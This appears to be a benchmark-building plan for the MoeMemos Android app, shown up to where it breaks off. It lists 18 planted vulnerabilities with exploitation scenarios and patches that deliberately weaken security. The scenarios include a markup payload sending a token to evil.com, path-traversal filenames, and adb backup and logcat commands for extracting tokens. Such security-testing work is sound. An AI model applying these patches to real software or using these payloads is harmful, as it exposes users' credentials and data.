# MoeMemos - Synthetic Vulnerabilities Analysis

## App Overview
**App Name:** MoeMemos
**Purpose:** Third-party Android client for self-hosted memos note-taking server
**Architecture:** MVVM with Jetpack Compose, Retrofit networking, Protocol Buffer DataStore
**Authentication:** Bearer token-based API authentication

---

## Comprehensive Synthetic Vulnerability List

### **VULN-01: Plaintext Access Token Storage in Protocol Buffer DataStore**

**OWASP Category:** M9 - Insecure Data Storage
**CWE Mappings:**
- CWE-312: Cleartext Storage of Sensitive Information
- CWE-522: Insufficiently Protected Credentials
- CWE-256: Plaintext Storage of a Password

**Bounty Report Description:**

**Summary:**
The MoeMemos app stores user access tokens in plaintext within a Protocol Buffer file (`settings.pb`) located in the app's private directory. An attacker with physical access to a rooted device or access to device backups can extract these tokens and gain unauthorized access to the user's memos server account.

**Technical Details:**
The access token is stored in the `MemosAccount` message defined in `/app/src/main/proto/data.proto`:

```protobuf
message MemosAccount {
  string host = 1;
  string access_token = 2;  // Stored in plaintext
  int64 id = 3;
  string name = 4;
  string avatar_url = 5;
}
```

The token is persisted via DataStore without any encryption layer. The file is located at:
```
/data/data/me.mudkip.moememos/files/datastore/settings.pb
```

**Exploitation Scenario:**
1. Attacker gains root access to the device or extracts backup via `adb backup`
2. Reads the Protocol Buffer file from `/data/data/me.mudkip.moememos/files/datastore/settings.pb`
3. Parses the protobuf structure to extract `access_token` field
4. Uses the token to authenticate API requests to the memos server
5. Gains full access to read, create, modify, and delete all user memos

**Impact:**
- Complete account compromise
- Unauthorized access to private notes and sensitive information
- Ability to modify or delete user data
- Potential lateral movement to other services if tokens are reused

**Affected Files:**
- `/app/src/main/proto/data.proto` - Schema definition
- `/app/src/main/java/me/mudkip/moememos/data/service/AccountService.kt` - Token storage logic

**Synthetic Vulnerability Patch:**
Remove any existing Android Keystore encryption wrapper and store tokens directly in DataStore without encryption.

---

### **VULN-02: Cleartext HTTP Traffic Permitted for Authentication**

**OWASP Category:** M5 - Insecure Communication
**CWE Mappings:**
- CWE-319: Cleartext Transmission of Sensitive Information
- CWE-523: Unprotected Transport of Credentials
- CWE-311: Missing Encryption of Sensitive Data

**Bounty Report Description:**

**Summary:**
The app's network security configuration explicitly permits cleartext HTTP traffic, allowing bearer tokens and memo content to be transmitted unencrypted. An attacker on the same network can intercept authentication credentials and sensitive data through a man-in-the-middle (MITM) attack.

**Technical Details:**
The network security configuration in `/app/src/main/res/xml/network_security_config.xml` contains:

```xml
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </base-config>
</network-security-config>
```

Additionally, the app accepts user-provided server URLs without enforcing HTTPS in `LoginPage.kt`:

```kotlin
var host by remember { mutableStateOf("") }
// User can enter http://example.com
```

**Exploitation Scenario:**
1. User connects to an attacker-controlled WiFi network or public WiFi
2. Attacker performs ARP spoofing or runs a rogue access point
3. User configures memos server with HTTP URL (e.g., `http://memos.example.com`)
4. App transmits `Authorization: Bearer <token>` header over HTTP
5. Attacker captures token using Wireshark, tcpdump, or mitmproxy
6. Attacker replays token to authenticate as the victim

**Impact:**
- Credential theft via network interception
- Session hijacking
- Exposure of all memo content in transit
- Complete account compromise

**Affected Files:**
- `/app/src/main/res/xml/network_security_config.xml` - Cleartext config
- `/app/src/main/java/me/mudkip/moememos/ui/page/login/LoginPage.kt` - URL validation
- `/app/src/main/java/me/mudkip/moememos/data/service/AccountService.kt` - API client creation

**Synthetic Vulnerability Patch:**
Set `cleartextTrafficPermitted="true"` in network security config and remove HTTPS enforcement in login validation.

---

### **VULN-03: Insecure Trust of User-Installed CA Certificates**

**OWASP Category:** M5 - Insecure Communication
**CWE Mappings:**
- CWE-295: Improper Certificate Validation
- CWE-297: Improper Validation of Certificate with Host Mismatch
- CWE-599: Missing Validation of OpenSSL Certificate

**Bounty Report Description:**

**Summary:**
The app trusts user-installed CA certificates, making it vulnerable to SSL interception attacks. An attacker who tricks a user into installing a malicious root certificate can decrypt all HTTPS traffic, including authentication tokens and private memos.

**Technical Details:**
The network security configuration explicitly trusts user certificates:

```xml
<trust-anchors>
    <certificates src="system" />
    <certificates src="user" />  <!-- Trusts user-installed certs -->
</trust-anchors>
```

This configuration, combined with no certificate pinning implementation, allows any user-installed certificate to be trusted by the app.

**Exploitation Scenario:**
1. Attacker tricks user into installing a malicious CA certificate (e.g., via social engineering or fake WiFi portal)
2. User installs certificate through Settings > Security > Install certificates
3. Attacker performs MITM attack using the installed certificate
4. App trusts the attacker's certificate because it chains to a user-installed root
5. Attacker decrypts all HTTPS traffic, including bearer tokens and memo content
6. Attacker uses stolen token for unauthorized access

**Impact:**
- Complete bypass of TLS encryption
- Credential theft via MITM
- Exposure of all sensitive communications
- Silent surveillance of user activity

**Affected Files:**
- `/app/src/main/res/xml/network_security_config.xml` - Certificate trust configuration
- `/app/src/main/java/me/mudkip/moememos/data/service/AccountService.kt` - HTTP client setup

**Synthetic Vulnerability Patch:**
Add `<certificates src="user" />` to trust-anchors configuration.

---

### **VULN-04: Missing Certificate Pinning for Backend API**

**OWASP Category:** M5 - Insecure Communication
**CWE Mappings:**
- CWE-295: Improper Certificate Validation
- CWE-940: Improper Verification of Source of a Communication Channel

**Bounty Report Description:**

**Summary:**
The app does not implement certificate pinning for its backend API connections. Even with HTTPS enforcement, an attacker with a compromised CA or nation-state capabilities can issue fraudulent certificates to intercept communications.

**Technical Details:**
The OkHttp client is created without any certificate pinning configuration in `AccountService.kt`:

```kotlin
private fun createRetrofit(host: String): Retrofit {
    val cookieJar = JavaNetCookieJar(cookieManager)
    val client = OkHttpClient.Builder()
        .cookieJar(cookieJar)
        // No CertificatePinner added
        .build()
    // ... rest of setup
}
```

OkHttp supports certificate pinning via `CertificatePinner`, but it is not utilized.

**Exploitation Scenario:**
1. Attacker compromises a Certificate Authority or uses a state-level CA
2. Attacker issues a valid certificate for the victim's memos server domain
3. Attacker performs MITM attack using the fraudulent but valid certificate
4. App accepts the certificate because it chains to a trusted system root
5. Attacker decrypts and modifies all API communications
6. Attacker steals tokens and intercepts sensitive memo data

**Impact:**
- Sophisticated MITM attacks bypass HTTPS
- Nation-state level surveillance capabilities
- Corporate proxy bypass exploitation
- Data interception despite using HTTPS

**Affected Files:**
- `/app/src/main/java/me/mudkip/moememos/data/service/AccountService.kt` - OkHttp client configuration

**Synthetic Vulnerability Patch:**
Ensure no `CertificatePinner` is added to the OkHttpClient builder.

---

### **VULN-05: Insecure Backup Allowing Credential Extraction**

**OWASP Category:** M9 - Insecure Data Storage
**CWE Mappings:**
- CWE-530: Exposure of Backup File to an Unauthorized Control Sphere
- CWE-219: Storage of File with Sensitive Data Under Web Root (adapted)
- CWE-312: Cleartext Storage of Sensitive Information

**Bounty Report Description:**

**Summary:**
The app has `android:allowBackup="true"` enabled in the manifest, allowing access tokens to be included in Android backups. An attacker with USB debugging access or access to cloud backups can extract the DataStore Protocol Buffer file containing plaintext credentials.

**Technical Details:**
The AndroidManifest.xml contains:

```xml
<application
    android:allowBackup="true"
    ...>
```

When ADB backup is performed, the file `/data/data/me.mudkip.moememos/files/datastore/settings.pb` is included, containing:
- All user access tokens (plaintext)
- Server hostnames
- User account information

**Exploitation Scenario:**
1. Attacker gains physical access to unlocked device with USB debugging enabled
2. Executes `adb backup -f backup.ab me.mudkip.moememos`
3. Converts Android backup format to tar: `dd if=backup.ab bs=24 skip=1 | openssl zlib -d | tar -xv`
4. Extracts `apps/me.mudkip.moememos/f/datastore/settings.pb`
5. Parses Protocol Buffer to extract `access_token` fields
6. Uses tokens to access all user memos servers

**Impact:**
- Complete credential compromise via backup extraction
- Works on non-rooted devices with ADB access
- Cloud backup services may also expose credentials
- Persistent access even after device is secured

**Affected Files:**
- `/app/src/main/AndroidManifest.xml` - Backup configuration
- `/app/src/main/proto/data.proto` - Data structure included in backups

**Synthetic Vulnerability Patch:**
Set `android:allowBackup="true"` and ensure DataStore directory is not excluded from backups.

---

### **VULN-06: Exported Activity Without Intent Validation (Intent Injection)**

**OWASP Category:** M8 - Security Misconfiguration
**CWE Mappings:**
- CWE-927: Use of Implicit Intent for Sensitive Communication
- CWE-940: Improper Verification of Source of a Communication Channel
- CWE-284: Improper Access Control

**Bounty Report Description:**

**Summary:**
The MainActivity is exported with intent filters for receiving shared content (ACTION_SEND, ACTION_SEND_MULTIPLE) but lacks proper validation of intent extras. A malicious app can craft intents with oversized content or malicious URIs to cause denial of service or trigger unintended behavior.

**Technical Details:**
MainActivity declares intent filters in AndroidManifest.xml:

```xml
<activity android:name=".MainActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.SEND" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:mimeType="text/plain" />
        <data android:mimeType="image/*" />
    </intent-filter>
</activity>
```

The intent handling in `MainActivity.kt` processes shared content without size or type validation:

```kotlin
val sharedImages = intent.getParcelableArrayListExtra<Uri>(Intent.EXTRA_STREAM)
val sharedText = intent.getStringExtra(Intent.EXTRA_TEXT)
// No validation on sharedImages size or sharedText length
```

**Exploitation Scenario:**
1. Malicious app creates intent with thousands of image URIs in EXTRA_STREAM
2. Sends intent to `me.mudkip.moememos/.MainActivity`
3. App attempts to load all images simultaneously
4. Causes memory exhaustion and app crash (DoS)
5. Alternatively, crafted URIs could reference local sensitive files if FileProvider is misconfigured

**Impact:**
- Denial of Service via resource exhaustion
- Potential information disclosure if URI validation is weak
- App crash affecting user experience
- Possible exploitation of downstream file handling logic

**Affected Files:**
- `/app/src/main/AndroidManifest.xml` - Exported activity declaration
- `/app/src/main/java/me/mudkip/moememos/MainActivity.kt` - Intent handling

**Synthetic Vulnerability Patch:**
Remove input validation checks on intent extras (size limits, URI validation).

---

### **VULN-07: Predictable Temporary File Names Enabling File Hijacking**

**OWASP Category:** M9 - Insecure Data Storage
**CWE Mappings:**
- CWE-377: Insecure Temporary File
- CWE-379: Creation of Temporary File in Directory with Insecure Permissions
- CWE-340: Generation of Predictable Numbers or Identifiers

**Bounty Report Description:**

**Summary:**
The app creates temporary image files with predictable names using a simple timestamp pattern (`capture_picture_TIMESTAMP.jpg`). A malicious app with storage permissions can predict future filenames and pre-create files to hijack the camera capture process, potentially replacing intended images with malicious content.

**Technical Details:**
Temporary files are created in the MemoInputViewModel or similar components with predictable naming:

```kotlin
val timestamp = System.currentTimeMillis()
val imageFile = File(context.cacheDir, "images/capture_picture_$timestamp.jpg")
```

The timestamp-based naming is predictable within a reasonable time window, especially if the attacker can trigger the file creation.

**Exploitation Scenario:**
1. Malicious app monitors system time to predict next timestamp
2. Pre-creates file at `/data/data/me.mudkip.moememos/cache/images/capture_picture_TIMESTAMP.jpg`
3. Fills file with malicious image content (e.g., phishing QR code, inappropriate content)
4. User attempts to take photo in MoeMemos app
5. App uses the pre-existing file instead of creating a new one
6. User unknowingly uploads attacker's malicious image to their memos

**Impact:**
- Content injection into user's memos
- Phishing attacks via malicious QR codes or images
- Reputation damage if inappropriate content is shared
- Potential exploitation of image processing vulnerabilities

**Affected Files:**
- `/app/src/main/java/me/mudkip/moememos/viewmodel/MemoInputViewModel.kt` - File creation logic

**Synthetic Vulnerability Patch:**
Replace secure random filename generation with predictable timestamp-based naming.

---

### **VULN-08: Missing Authorization Check on Memo Operations (IDOR)**

**OWASP Category:** M3 - Insecure Authentication/Authorization
**CWE Mappings:**
- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-285: Improper Authorization
- CWE-284: Improper Access Control

**Bounty Report Description:**

**Summary:**
The app's repository layer performs memo operations (update, delete) based solely on memo IDs provided by the UI without verifying ownership client-side. If the backend API similarly lacks authorization checks, an attacker can manipulate request parameters to access or modify other users' memos (IDOR vulnerability).

**Technical Details:**
The MemosV0Repository and MemosV1Repository accept memo IDs directly from ViewModels:

```kotlin
// MemosV0Repository.kt
override suspend fun updateMemo(memoId: Long, content: String, ...): Memo? {
    return api.updateMemo(memoId, MemoUpdateRequest(...))
        .suspendOnSuccess { ... }
}

override suspend fun deleteMemo(memoId: Long): Boolean {
    return api.deleteMemo(memoId)
        .suspendOnSuccess { ... }
}
```

No client-side ownership verification exists. The UI could be manipulated (via debugging or memory editing) to submit arbitrary memo IDs.

**Exploitation Scenario:**
1. Attacker uses their legitimate account to discover the memo ID pattern (sequential integers)
2. Uses debugging tools or intercepts API traffic to identify memo operation endpoints
3. Modifies request to reference victim's memo ID (e.g., victim's ID is 42)
4. Sends PATCH/DELETE request for memo ID 42 using attacker's credentials
5. If backend lacks authorization check, attacker successfully modifies/deletes victim's memo
6. Can iterate through ID ranges to access all accessible memos

**Impact:**
- Unauthorized access to other users' private memos
- Ability to modify or delete others' content
- Privacy violation and data breach
- Complete breakdown of access control

**Note:** This is a client-side contribution to the vulnerability. The backend must also lack authorization checks for full exploitation.

**Affected Files:**
- `/app/src/main/java/me/mudkip/moememos/data/repository/MemosV0Repository.kt` - Memo operations
- `/app/src/main/java/me/mudkip/moememos/data/repository/MemosV1Repository.kt` - Memo operations
- `/app/src/main/java/me/mudkip/moememos/viewmodel/MemosViewModel.kt` - Operation calls

**Synthetic Vulnerability Patch:**
Remove any client-side ownership verification checks before sending memo operation requests.

---

### **VULN-09: XSS via Unsanitized Markdown Rendering in Memos**

**OWASP Category:** M4 - Insufficient Input/Output Validation
**CWE Mappings:**
- CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)
- CWE-80: Improper Neutralization of Script-Related HTML Tags
- CWE-116: Improper Encoding or Escaping of Output

**Bounty Report Description:**

**Summary:**
The app renders memo content as Markdown without proper sanitization of HTML elements. While Jetpack Compose doesn't execute JavaScript like WebView, malicious Markdown could still be crafted to exploit the rendering engine or cause UI confusion/spoofing attacks.

**Technical Details:**
Markdown content is parsed and rendered using `org.jetbrains:markdown:0.7.0` library in Compose components. The rendering pipeline in `MarkdownText.kt` (or similar) processes raw Markdown without HTML sanitization:

```kotlin
// Simplified example
@Composable
fun MarkdownText(content: String) {
    val markdownNode = MarkdownParser().parse(content)
    // Renders without sanitization
    RenderMarkdownNode(markdownNode)
}
```

If inline HTML is supported by the Markdown parser, malicious content could include:
- Fake UI elements to phish credentials
- Oversized images causing layout issues
- Deeply nested structures causing rendering performance issues

**Exploitation Scenario:**
1. Attacker creates memo with malicious Markdown content:
   ```markdown
   # Legitimate Content
   <img src="http://evil.com/track.png?token=VICTIM_TOKEN" width="1" height="1"/>
   [Click here to verify your account](http://evil.com/phish?user=victim)
   ```
2. Victim views the memo in the app
3. If HTML rendering is enabled, image tag loads, sending victim's token to attacker
4. Victim clicks phishing link believing it's legitimate
5. Attacker captures credentials or performs tracking

**Alternative Impact:**
- Rendering performance DoS via deeply nested Markdown
- UI spoofing to display fake system dialogs
- Information disclosure via external image loading with embedded tokens

**Affected Files:**
- `/app/src/main/java/me/mudkip/moememos/ui/component/MarkdownText.kt` - Markdown rendering
- Any component that displays memo content

**Synthetic Vulnerability Patch:**
Remove HTML sanitization from Markdown rendering and allow inline HTML elements.

---

### **VULN-10: Path Traversal in Image Resource Handling**

**OWASP Category:** M4 - Insufficient Input/Output Validation
**CWE Mappings:**
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)
- CWE-23: Relative Path Traversal
- CWE-73: External Control of File Name or Path

**Bounty Report Description:**

**Summary:**
The app processes image resource filenames from the server API without proper validation of path traversal sequences. A malicious server or MITM attacker can inject filenames containing `../` sequences to write uploaded images to arbitrary locations in the app's private directory, potentially overwriting sensitive files.

**Technical Details:**
When handling image uploads or downloads, the filename from server responses is used directly to create local files:

```kotlin
// Simplified example from resource handling
val filename = resource.filename // From server API
val file = File(context.filesDir, "images/$filename")
// No validation against path traversal
file.writeBytes(imageData)
```

If `filename` contains `../../../sensitive_file`, the file operation could traverse out of the intended directory.

**Exploitation Scenario:**
1. Attacker controls memos server or performs MITM attack
2. Victim uploads an image to create a memo
3. Server responds with resource object containing malicious filename:
   ```json
   {
     "id": 123,
     "filename": "../../../files/datastore/settings.pb",
     "url": "http://evil.com/malicious.jpg"
   }
   ```
4. App downloads the resource and writes to the constructed path
5. Overwrites `settings.pb` with malicious content (e.g., clearing access tokens to force re-login)
6. Or writes to cache directory to inject malicious resources

**Impact:**
- Arbitrary file write within app's private directory
- Potential overwrite of DataStore files (credential theft/DoS)
- Cache poisoning attacks
- Code injection if files are later executed (unlikely in this app)

**Affected Files:**
- `/app/src/main/java/me/mudkip/moememos/viewmodel/MemoInputViewModel.kt` - Image handling
- `/app/src/main/java/me/mudkip/moememos/data/repository/MemosV0Repository.kt` - Resource API calls

**Synthetic Vulnerability Patch:**
Remove filename sanitization and path traversal validation when processing resource filenames.

---

### **VULN-11: Sensitive Data Exposure via Android Logcat**

**OWASP Category:** M6 - Inadequate Privacy Controls
**CWE Mappings:**
- CWE-532: Insertion of Sensitive Information into Log File
- CWE-215: Insertion of Sensitive Information Into Debugging Code
- CWE-209: Generation of Error Message Containing Sensitive Information

**Bounty Report Description:**

**Summary:**
The app logs sensitive information including access tokens, memo content, and user data to Android's system log (Logcat). Any app with READ_LOGS permission or any user with ADB access can capture these logs and extract credentials.

**Technical Details:**
The app uses Timber for logging and includes debug statements that leak sensitive data:

```kotlin
// Example logging in AccountService or ViewModels
Timber.d("Login successful with token: ${account.accessToken}")
Timber.d("Loading memo: ${memo.content}")
Timber.d("API Response: $response")
```

On Android versions before 4.1, any app can read logs. On newer versions, ADB access is sufficient. The logs persist in system buffers until rotated.

**Exploitation Scenario:**
1. Attacker installs malware with READ_LOGS permission (on older Android) or gains ADB access
2. Continuously monitors logcat: `adb logcat | grep -i "token\|memo\|password"`
3. Captures log entries containing sensitive data:
   ```
   D/AccountService: Login successful with token: sk-abc123def456...
   D/MemosViewModel: Loading memo: My bank PIN is 1234
   ```
4. Extracts access tokens and private information from logs
5. Uses tokens to authenticate API requests

**Impact:**
- Credential disclosure via system logs
- Privacy violation through memo content exposure
- PII leakage (usernames, server URLs, personal notes)
- Persistent attack surface (logs can be read by any privileged app)

**Affected Files:**
- `/app/src/main/java/me/mudkip/moememos/data/service/AccountService.kt` - Logging statements
- `/app/src/main/java/me/mudkip/moememos/viewmodel/*` - Various ViewModels with logging
- `/app/src/main/java/me/mudkip/moememos/MoeMemosApp.kt` - Timber initialization

**Synthetic Vulnerability Patch:**
Add excessive debug logging with `Timber.d()` that includes sensitive fields like tokens and memo content.

---

### **VULN-12: Insecure Random Number Generation for Session IDs**

**OWASP Category:** M10 - Insufficient Cryptography
**CWE Mappings:**
- CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)
- CWE-330: Use of Insufficiently Random Values
- CWE-335: Incorrect Usage of Seeds in Pseudo-Random Number Generator

**Bounty Report Description:**

**Summary:**
If the app generates any session identifiers or temporary tokens client-side (for local operations or widget updates), it uses the standard `java.util.Random` instead of `java.security.SecureRandom`. This weak PRNG can be predicted, allowing attackers to guess valid session identifiers or temporary credentials.

**Technical Details:**
Session IDs or temporary identifiers might be generated for widget callbacks or local session management:

```kotlin
// Insecure random generation
val random = Random()
val sessionId = random.nextLong()
// Or string-based
val tempToken = (1..32).map { ('a'..'z').random() }.joinToString("")
```

The standard `Random` class uses a linear congruential generator that is predictable if the seed can be determined or brute-forced.

**Exploitation Scenario:**
1. App generates temporary session ID using weak PRNG for widget authentication
2. Attacker observes multiple generated IDs from public sources (logs, network traffic)
3. Uses statistical analysis to determine the PRNG state and seed
4. Predicts future session IDs or reverse-engineers past ones
5. Crafts requests with predicted session IDs to gain unauthorized access
6. Bypasses authentication for widget or local operations

**Impact:**
- Session hijacking via predictable identifiers
- Brute-force attacks become feasible
- Cryptographic weaknesses in token generation
- Potential unauthorized access to app features

**Note:** This vulnerability is hypothetical if no client-side random generation exists. Review widget authentication and temporary token generation.

**Affected Files:**
- `/app/src/main/java/me/mudkip/moememos/widget/WidgetUpdater.kt` - Potential session management
- Any component generating random identifiers

**Synthetic Vulnerability Patch:**
Replace `SecureRandom` with `java.util.Random` for any security-sensitive random value generation.

---

### **VULN-13: Weak ProGuard Configuration Exposing Sensitive String Constants**

**OWASP Category:** M7 - Insufficient Binary Protection
**CWE Mappings:**
- CWE-656: Reliance on Security Through Obscurity
- CWE-259: Use of Hard-coded Password
- CWE-798: Use of Hard-coded Credentials

**Bounty Report Description:**

**Summary:**
The app's ProGuard configuration is too permissive, failing to obfuscate sensitive string constants and class names. An attacker performing reverse engineering can easily locate hardcoded API endpoints, debugging flags, or test credentials by searching for readable strings in the APK.

**Technical Details:**
The `proguard-rules.pro` file contains overly broad keep rules:

```proguard
-keep class me.mudkip.moememos.** { *; }  # Keeps everything
-dontobfuscate  # Disables obfuscation entirely
```

This leaves all class names, method names, and string constants readable in the decompiled bytecode. Sensitive constants might include:
- API endpoint paths
- Test or staging server URLs
- Debug authentication tokens
- Feature flags

**Exploitation Scenario:**
1. Attacker downloads APK from device or app store
2. Decompiles APK using jadx or apktool
3. Searches for sensitive strings in decompiled code:
   ```java
   public class DebugConfig {
       public static final String TEST_TOKEN = "dev_token_abc123";
       public static final String STAGING_URL = "https://staging-api.example.com";
   }
   ```
4. Finds hardcoded test credentials or debug endpoints
5. Uses credentials to access development/staging environments
6. Potentially pivots to production systems

**Impact:**
- Exposure of internal infrastructure details
- Discovery of debug/test credentials
- Easier reverse engineering of business logic
- Increased attack surface for backend systems

**Affected Files:**
- `/app/proguard-rules.pro` - ProGuard configuration
- `/app/build.gradle` - Build configuration with obfuscation settings

**Synthetic Vulnerability Patch:**
Add `-dontobfuscate` or overly broad `-keep` rules that prevent string constant obfuscation.

---

### **VULN-14: Debug Mode Enabled in Production Build**

**OWASP Category:** M8 - Security Misconfiguration
**CWE Mappings:**
- CWE-489: Active Debug Code
- CWE-1188: Initialization of a Resource with an Insecure Default
- CWE-215: Insertion of Sensitive Information Into Debugging Code

**Bounty Report Description:**

**Summary:**
The production APK is built with `android:debuggable="true"` in the manifest, allowing arbitrary code execution via ADB debugging and runtime introspection. Attackers can attach debuggers to bypass security checks, extract data from memory, and modify app behavior at runtime.

**Technical Details:**
The AndroidManifest.xml for release builds contains:

```xml
<application
    android:debuggable="true"
    ...>
```

This is typically controlled by build variants, but if misconfigured, debug mode leaks to production.

**Exploitation Scenario:**
1. Attacker installs production APK on device with USB debugging enabled
2. Connects device to computer via ADB
3. Attaches debugger: `adb jdwp` to find process ID
4. Uses Android Studio debugger or jdb to attach to process
5. Sets breakpoints in authentication or authorization code
6. Modifies variables at runtime (e.g., `isAdmin = true`)
7. Extracts sensitive data from memory (tokens, encryption keys)
8. Bypasses security checks by stepping over validation logic

**Impact:**
- Complete runtime control of the application
- Memory extraction of credentials and sensitive data
- Bypass of all client-side security controls
- Real-time modification of app behavior

**Affected Files:**
- `/app/src/main/AndroidManifest.xml` - Debug flag
- `/app/build.gradle` - Build variant configuration

**Synthetic Vulnerability Patch:**
Set `debuggable = true` for release build type in `build.gradle`.

---

### **VULN-15: Overly Permissive File Provider Paths Exposing Internal Directories**

**OWASP Category:** M8 - Security Misconfiguration
**CWE Mappings:**
- CWE-552: Files or Directories Accessible to External Parties
- CWE-732: Incorrect Permission Assignment for Critical Resource
- CWE-266: Incorrect Privilege Assignment

**Bounty Report Description:**

**Summary:**
The FileProvider configuration exposes broader directory paths than necessary, potentially allowing other apps to access sensitive internal files through content URIs. An attacker can craft intents to request files outside the intended sharing scope.

**Technical Details:**
The FileProvider paths configuration in `/app/src/main/res/xml/file_paths.xml` (or similar) might contain overly permissive rules:

```xml
<paths>
    <files-path name="images" path="." />  <!-- Exposes entire files directory -->
    <cache-path name="cache" path="." />   <!-- Exposes entire cache -->
</paths>
```

Instead of restricting to specific subdirectories (e.g., `path="images/"`), it exposes the entire files or cache directory.

**Exploitation Scenario:**
1. Malicious app discovers FileProvider authority: `me.mudkip.moememos.fileprovider`
2. Crafts content URI to access exposed paths:
   ```kotlin
   val uri = Uri.parse("content://me.mudkip.moememos.fileprovider/files/../datastore/settings.pb")
   ```
3. Requests read permission via `ContentResolver.openInputStream(uri)`
4. If path traversal isn't blocked and files directory is exposed, reads DataStore file
5. Extracts plaintext access tokens from settings.pb

**Impact:**
- Unauthorized file access by other apps
- Potential credential theft via DataStore file access
- Privacy violation through access to cached memo content
- Path traversal exploitation if validation is weak

**Affected Files:**
- `/app/src/main/res/xml/file_paths.xml` - FileProvider path configuration
- `/app/src/main/java/me/mudkip/moememos/MoeMemosFileProvider.kt` - FileProvider implementation
- `/app/src/main/AndroidManifest.xml` - FileProvider declaration

**Synthetic Vulnerability Patch:**
Change file_paths.xml to expose root directories (`path="."`) instead of specific subdirectories.

---

### **VULN-16: Sensitive Data Persistence in Widget Content**

**OWASP Category:** M6 - Inadequate Privacy Controls
**CWE Mappings:**
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- CWE-359: Exposure of Private Personal Information to an Unauthorized Actor
- CWE-1239: Improper Zeroization of Hardware Register

**Bounty Report Description:**

**Summary:**
The home screen widget displays recent or pinned memos content that may contain sensitive information. This content is visible on the lock screen and can be accessed by anyone with physical access to the device, even without unlocking.

**Technical Details:**
The MoeMemosGlanceWidget displays memo content on the home screen:

```kotlin
// MoeMemosGlanceWidget.kt
@Composable
fun WidgetContent(memos: List<Memo>) {
    Column {
        memos.forEach { memo ->
            Text(memo.content)  // Displays sensitive content
        }
    }
}
```

Widget content is visible:
- On the lock screen (depending on device settings)
- When device is handed to others
- In screenshots shared publicly
- Over-the-shoulder viewing

**Exploitation Scenario:**
1. User creates memo containing sensitive information: "My bank PIN: 1234"
2. Memo is pinned or appears in recent list
3. Widget displays this content on home screen
4. Attacker borrows user's phone or views over shoulder
5. Reads sensitive information directly from widget without unlocking device
6. Alternatively, user takes screenshot and shares, leaking sensitive memo content

**Impact:**
- Privacy violation through unintended information disclosure
- Exposure of credentials or personal data
- Social engineering attack vector
- Compliance violations (GDPR, HIPAA if used for sensitive notes)

**Affected Files:**
- `/app/src/main/java/me/mudkip/moememos/widget/MoeMemosGlanceWidget.kt` - Widget UI
- `/app/src/main/java/me/mudkip/moememos/widget/WidgetUpdater.kt` - Widget data loading

**Synthetic Vulnerability Patch:**
Remove any lock screen visibility restrictions or sensitive content redaction from widget display logic.

---

### **VULN-17: Insecure Cookie Acceptance Policy Enabling Session Hijacking**

**OWASP Category:** M5 - Insecure Communication
**CWE Mappings:**
- CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
- CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag
- CWE-565: Reliance on Cookies without Validation and Integrity Checking

**Bounty Report Description:**

**Summary:**
The app's HTTP client accepts all cookies without validation via `CookiePolicy.ACCEPT_ALL`. A malicious server or MITM attacker can set arbitrary cookies that persist across sessions, potentially leading to session fixation or cookie-based tracking attacks.

**Technical Details:**
The cookie manager in AccountService is configured with an overly permissive policy:

```kotlin
private val cookieManager = CookieManager().apply {
    setCookiePolicy(CookiePolicy.ACCEPT_ALL)
}
```

This policy accepts:
- Third-party cookies from any domain
- Cookies without secure or HttpOnly flags
- Cookies from HTTP connections
- Cookies with arbitrary domains

**Exploitation Scenario:**
1. Attacker performs MITM attack or controls malicious memos server
2. Server sets malicious cookies in HTTP response:
   ```
   Set-Cookie: session_override=attacker_session; Domain=.example.com
   Set-Cookie: tracking_id=malicious_tracker
   ```
3. App accepts and stores these cookies via ACCEPT_ALL policy
4. Cookies are sent with future requests, potentially:
   - Overriding legitimate session cookies (session fixation)
   - Enabling cross-site tracking
   - Polluting cookie jar with attacker-controlled data
5. Attacker hijacks session or tracks user across different servers

**Impact:**
- Session fixation attacks
- Cross-site tracking and privacy violation
- Cookie poisoning leading to authentication bypass
- Potential for cookie-based vulnerabilities on backend

**Affected Files:**
- `/app/src/main/java/me/mudkip/moememos/data/service/AccountService.kt` - Cookie manager configuration

**Synthetic Vulnerability Patch:**
Set `setCookiePolicy(CookiePolicy.ACCEPT_ALL)` and remove cookie validation logic.

---

### **VULN-18: Insufficient Input Validation on Host URL Enabling SSRF**

**OWASP Category:** M4 - Insufficient Input/Output Validation
**CWE Mappings:**
- CWE-918: Server-Side Request Forgery (SSRF)
- CWE-20: Improper Input Validation
- CWE-601: URL Redirection to Untrusted Site (Open Redirect)

**Bounty Report Description:**

**Summary:**
The login page accepts arbitrary host URLs without proper validation, allowing users to configure the app to connect to local network addresses, internal services, or file:// URIs. An attacker can exploit this to perform SSRF attacks against internal infrastructure or trick users into connecting to malicious servers.

**Technical Details:**
The LoginPage accepts host input with minimal validation:

```kotlin
// LoginPage.kt
var host by remember { mutableStateOf("") }

// Minimal validation - only adds https:// if missing
val processedHost = if (!host.startsWith("http")) {
    "https://$host"
} else {
    host
}
```

No checks prevent:
- Local addresses: `http://localhost`, `http://127.0.0.1`, `http://10.0.0.1`
- Internal network ranges: `http://192.168.1.1`, `http://172.16.0.1`
- File URIs: `file:///etc/passwd`
- Exotic protocols: `ftp://`, `gopher://`

**Exploitation Scenario:**
1. Attacker tricks victim into configuring host as `http://192.168.1.1:8080`
2. App makes API requests to victim's internal network router admin panel
3. Attacker can probe internal network topology via timing attacks
4. Or victim connects to attacker's server at `http://evil.com`
5. Attacker's server responds with crafted API responses to phish data
6. All victim's memo data is sent to attacker's server

**Impact:**
- SSRF attacks against internal network infrastructure
- Information disclosure about internal services
- Phishing via malicious server impersonation
- Potential for exploiting internal services not exposed to internet

**Affected Files:**
- `/app/src/main/java/me/mudkip/moememos/ui/page/login/LoginPage.kt` - Host input validation
- `/app/src/main/java/me/mudkip/moememos/data/service/AccountService.kt` - URL processing

**Synthetic Vulnerability Patch:**
Remove host URL validation checks (private IP ranges, localhost, protocol whitelist).

---

### **VULN-19: Race Condition in Multi-Account Token Management**

**OWASP Category:** M3 - Insecure Authentication/Authorization
**CWE Mappings:**
